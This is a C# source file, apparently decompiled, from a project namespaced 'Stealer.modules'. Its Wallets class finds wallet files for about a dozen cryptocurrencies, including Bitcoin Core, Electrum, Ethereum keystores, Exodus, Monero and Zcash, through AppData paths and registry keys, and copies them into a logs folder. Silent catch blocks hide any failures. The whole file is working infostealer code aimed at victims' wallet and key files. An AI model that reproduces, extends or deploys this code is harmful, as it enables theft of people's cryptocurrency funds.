using System;
using System.IO;
using Microsoft.Win32;

namespace Stealer.modules
{
	// Token: 0x02000038 RID: 56
	internal class Wallets
	{
		// Token: 0x06000127 RID: 295 RVA: 0x0000D504 File Offset: 0x0000B704
		public static void GetWallets()
		{
			Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets");
			Wallets.GetArmory();
			Wallets.GetAtomicWallet();
			Wallets.GetBitcoinCore();
			Wallets.GetByteCoin();
			Wallets.GetDashCore();
			Wallets.GetElectrum();
			Wallets.GetEthereum();
			Wallets.GetExodus();
			Wallets.GetJaxx();
			Wallets.GetLitecoinCore();
			Wallets.GetMonero();
			Wallets.GetZcash();
		}

		// Token: 0x06000128 RID: 296 RVA: 0x0000D564 File Offset: 0x0000B764
		public static void GetArmory()
		{
			if (!Directory.Exists(Wallets.AppDate + "\\Armory\\"))
			{
				return;
			}
			string str = "\\Wallets\\Armory\\";
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\Armory\\").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x0000D5F8 File Offset: 0x0000B7F8
		public static void GetAtomicWallet()
		{
			if (!Directory.Exists(Wallets.AppDate + "\\atomic\\Local Storage\\leveldb\\"))
			{
				return;
			}
			string str = "\\Wallets\\Atomic\\";
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012A RID: 298 RVA: 0x0000D68C File Offset: 0x0000B88C
		public static void GetBitcoinCore()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
				{
					try
					{
						if (registryKey.GetValue("strDataDir") != null)
						{
							Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\BitcoinCore\\");
							File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\BitcoinCore\\wallet.dat");
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012B RID: 299 RVA: 0x0000D750 File Offset: 0x0000B950
		public static void GetByteCoin()
		{
			if (!Directory.Exists(Wallets.AppDate + "\\bytecoin"))
			{
				return;
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\bytecoin").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\Bytecoin\\");
					if (fileInfo.Extension.Equals(".wallet"))
					{
						fileInfo.CopyTo(Wallets.pathToLogs + "\\Bytecoin\\" + fileInfo.Name);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012C RID: 300 RVA: 0x0000D7F8 File Offset: 0x0000B9F8
		public static void GetDashCore()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
				{
					try
					{
						if (registryKey.GetValue("strDataDir") != null)
						{
							Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\DashCore\\");
							File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\DashCore\\wallet.dat");
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012D RID: 301 RVA: 0x0000D8BC File Offset: 0x0000BABC
		public static void GetElectrum()
		{
			string str = "\\Wallets\\Electrum\\";
			if (!Directory.Exists(Wallets.AppDate + "\\Electrum\\wallets"))
			{
				return;
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\Electrum\\wallets").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012E RID: 302 RVA: 0x0000D950 File Offset: 0x0000BB50
		public static void GetEthereum()
		{
			string str = "\\Wallets\\Ethereum\\";
			if (!Directory.Exists(Wallets.AppDate + "\\Ethereum\\keystore"))
			{
				return;
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\Ethereum\\keystore").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600012F RID: 303 RVA: 0x0000D9E4 File Offset: 0x0000BBE4
		public static void GetExodus()
		{
			string str = "\\Wallets\\Exodus\\";
			if (!Directory.Exists(Wallets.AppDate + "\\Exodus\\exodus.wallet\\"))
			{
				return;
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000130 RID: 304 RVA: 0x0000DA78 File Offset: 0x0000BC78
		public static void GetJaxx()
		{
			string str = "\\Wallets\\Jaxx\\";
			if (!Directory.Exists(Wallets.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\"))
			{
				return;
			}
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000131 RID: 305 RVA: 0x0000DB0C File Offset: 0x0000BD0C
		public static void GetLitecoinCore()
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
				{
					try
					{
						if (registryKey.GetValue("strDataDir") != null)
						{
							Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\LitecoinCore\\");
							File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\LitecoinCore\\wallet.dat");
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000132 RID: 306 RVA: 0x0000DBD0 File Offset: 0x0000BDD0
		public static void GetMonero()
		{
			string str = "\\Wallets\\Monero\\";
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
				{
					try
					{
						if (registryKey.GetValue("wallet_path") != null)
						{
							Directory.CreateDirectory(Wallets.pathToLogs + str);
							string text = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
							Directory.CreateDirectory(Wallets.pathToLogs + str);
							File.Copy(text, Wallets.pathToLogs + str + text.Split(new char[]
							{
								'\\'
							})[text.Split(new char[]
							{
								'\\'
							}).Length - 1]);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000133 RID: 307 RVA: 0x0000DCD8 File Offset: 0x0000BED8
		public static void GetZcash()
		{
			string str = "\\Wallets\\Zcash\\";
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Wallets.AppDate + "\\Zcash\\").GetFiles())
				{
					Directory.CreateDirectory(Wallets.pathToLogs + str);
					fileInfo.CopyTo(Wallets.pathToLogs + str + fileInfo.Name);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400008E RID: 142
		public static string pathToLogs = Program.path;

		// Token: 0x0400008F RID: 143
		public static string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}
}
